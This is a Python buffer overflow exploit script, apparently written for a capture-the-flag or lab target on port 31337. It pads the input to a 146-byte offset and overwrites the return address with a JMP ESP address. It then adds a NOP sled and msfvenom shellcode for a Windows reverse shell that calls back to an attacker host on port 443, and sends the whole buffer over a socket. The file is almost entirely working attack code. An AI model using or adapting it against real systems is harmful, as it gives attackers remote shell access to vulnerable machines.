#!/usr/bin/env python3
#2025-01-17

import socket

ip = "10.10.55.51"
port = 31337

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\x0a"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
usechars = bytes(usechars, "latin-1")
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# msfvenom --payload 'windows/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=443 --format 'python' --bad-chars '\x00\x0a'
buf =  b""
buf += b"\xd9\xec\xd9\x74\x24\xf4\xb8\xac\xf9\x09\xed\x5b"
buf += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\xef"
buf += b"\xea\xeb\x18\x13\xe4\x6e\xe2\xeb\xf5\x0e\x6a\x0e"
buf += b"\xc4\x0e\x08\x5b\x77\xbf\x5a\x09\x74\x34\x0e\xb9"
buf += b"\x0f\x38\x87\xce\xb8\xf7\xf1\xe1\x39\xab\xc2\x60"
buf += b"\xba\xb6\x16\x42\x83\x78\x6b\x83\xc4\x65\x86\xd1"
buf += b"\x9d\xe2\x35\xc5\xaa\xbf\x85\x6e\xe0\x2e\x8e\x93"
buf += b"\xb1\x51\xbf\x02\xc9\x0b\x1f\xa5\x1e\x20\x16\xbd"
buf += b"\x43\x0d\xe0\x36\xb7\xf9\xf3\x9e\x89\x02\x5f\xdf"
buf += b"\x25\xf1\xa1\x18\x81\xea\xd7\x50\xf1\x97\xef\xa7"
buf += b"\x8b\x43\x65\x33\x2b\x07\xdd\x9f\xcd\xc4\xb8\x54"
buf += b"\xc1\xa1\xcf\x32\xc6\x34\x03\x49\xf2\xbd\xa2\x9d"
buf += b"\x72\x85\x80\x39\xde\x5d\xa8\x18\xba\x30\xd5\x7a"
buf += b"\x65\xec\x73\xf1\x88\xf9\x09\x58\xc5\xce\x23\x62"
buf += b"\x15\x59\x33\x11\x27\xc6\xef\xbd\x0b\x8f\x29\x3a"
buf += b"\x6b\xba\x8e\xd4\x92\x45\xef\xfd\x50\x11\xbf\x95"
buf += b"\x71\x1a\x54\x65\x7d\xcf\xfb\x35\xd1\xa0\xbb\xe5"
buf += b"\x91\x10\x54\xef\x1d\x4e\x44\x10\xf4\xe7\xef\xeb"
buf += b"\x9f\x0d\xe5\xec\x30\x7a\x07\x12\xce\xc1\x8e\xf4"
buf += b"\xba\x25\xc7\xaf\x52\xdf\x42\x3b\xc2\x20\x59\x46"
buf += b"\xc4\xab\x6e\xb7\x8b\x5b\x1a\xab\x7c\xac\x51\x91"
buf += b"\x2b\xb3\x4f\xbd\xb0\x26\x14\x3d\xbe\x5a\x83\x6a"
buf += b"\x97\xad\xda\xfe\x05\x97\x74\x1c\xd4\x41\xbe\xa4"
buf += b"\x03\xb2\x41\x25\xc1\x8e\x65\x35\x1f\x0e\x22\x61"
buf += b"\xcf\x59\xfc\xdf\xa9\x33\x4e\x89\x63\xef\x18\x5d"
buf += b"\xf5\xc3\x9a\x1b\xfa\x09\x6d\xc3\x4b\xe4\x28\xfc"
buf += b"\x64\x60\xbd\x85\x98\x10\x42\x5c\x19\x20\x09\xfc"
buf += b"\x08\xa9\xd4\x95\x08\xb4\xe6\x40\x4e\xc1\x64\x60"
buf += b"\x2f\x36\x74\x01\x2a\x72\x32\xfa\x46\xeb\xd7\xfc"
buf += b"\xf5\x0c\xf2"

offset = 146
overflow = b"A" * offset
retn = b"\xc3\x14\x04\x08" #080414C3 - pos of JMP ESP
padding = b"\x90" * 16  #space to expand in

#payload = usechars
payload = buf

buffer = overflow + retn + padding + payload + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))

  # In case there's a start text
  # print(s.recv(1024))
  
  # This one uses a "login", really the user name
  # print("Sending user name")
  # s.send(bytes("username123", "latin-1"))
  # print(s.recv(1024))
  
  print("Sending payload...")
  s.send(buffer + b"\r\n") #add \r\n if can't recv data
  print("Done!")
  
except:
  print("Exception: "+str(e))
